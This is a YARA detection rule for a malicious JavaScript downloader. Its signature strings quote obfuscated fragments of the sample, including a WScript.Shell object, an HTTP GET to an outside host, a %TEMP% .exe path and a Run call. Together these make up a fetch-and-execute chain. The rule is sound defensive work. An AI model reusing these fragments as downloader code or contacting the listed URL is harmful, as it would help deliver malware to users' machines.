rule sig_20160328_11a78e4a894673e5b9265cbdb17af319 {
  meta:
    description = "datamaliciousorder - file 20160328_11a78e4a894673e5b9265cbdb17af319.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a0ffce427ae47d9f8cdd1f094c41aa76d383965e0f526762a072968bc42797e7"

  strings:
    $s1  = "function Eanlekfcbs() {return Gzipwprv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WCNn4RFRI.exe\";};" fullword ascii
    $s2  = "do {WScript[Uogbluyr](Fhhxtzfjdw() * 11)} while (Odzenaoc[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Gzipwprv = function Tddlocx() {return WScript[Uvcokmw](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Jffqrt(Oryoa, Apyae){return Oryoa - Apyae;};" fullword ascii
    $s5  = "Odzenaoc[Ntupll](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Begbvf(Bnddajgmq){Gzipwprv[\"Run\"](Bnddajgmq, Dxmftyhr, Dxmftyhr);};" fullword ascii
    $s7  = "function Snwcchyh() {return ((Lhgfistlv == true) && (Lhgfistlv == Ssgbkvqcg)) ? 1 : Dxmftyhr;};" fullword ascii
    $s8  = "function Fhhxtzfjdw(){return 22;};" fullword ascii
    $s9  = "var Qachhgxq = false;" fullword ascii
    $s10 = "function Lopeybgjzi(){return Nzzynmvupc;};" fullword ascii
    $s11 = "function Zketfpsw(){return Uvcokmw;};" fullword ascii
    $s12 = "return Jffqrt(Tzzmwv, Difmudvf);" fullword ascii
    $s13 = "Ssgbkvqcg = true; " fullword ascii
    $s14 = "var Ssgbkvqcg = false;" fullword ascii
    $s15 = "function Lypmmsq()" fullword ascii
    $s16 = "var Lhgfistlv = false;" fullword ascii
    $s17 = "var Xfxsxnpvkx = new this[\"Date\"]();" fullword ascii
    $s18 = "Lhgfistlv = true; " fullword ascii
    $s19 = "function Vlltzfaoe(Rcluclq) {var Rdncp = (1, 2, 3, 4, 5, Rcluclq); return Rdncp;};" fullword ascii
    $s20 = " while (Djlfak){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}